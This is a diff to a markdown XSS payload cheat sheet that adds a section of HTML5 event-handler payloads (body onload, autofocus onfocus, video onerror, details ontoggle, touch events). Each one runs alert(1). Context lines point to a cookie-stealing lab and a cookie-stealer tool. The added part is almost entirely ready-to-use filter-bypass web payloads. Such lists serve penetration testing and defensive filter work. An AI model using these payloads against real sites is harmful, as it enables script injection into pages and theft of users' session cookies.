@@ -57,6 +57,26 @@ print("<script>alert('XSS')</script>")
 <div onpointerup="alert(45)">MOVE HERE</div>
 ```
 
+### XSS using HTML5 tags
+```javascript
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+
+<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
+<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
+<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
+```
+
 ## XSS to Stealth Cookies
 - Practice this payload here [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
 - XSS Cookie Stealer Tool [Steal Cookies with Reflected XSS](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
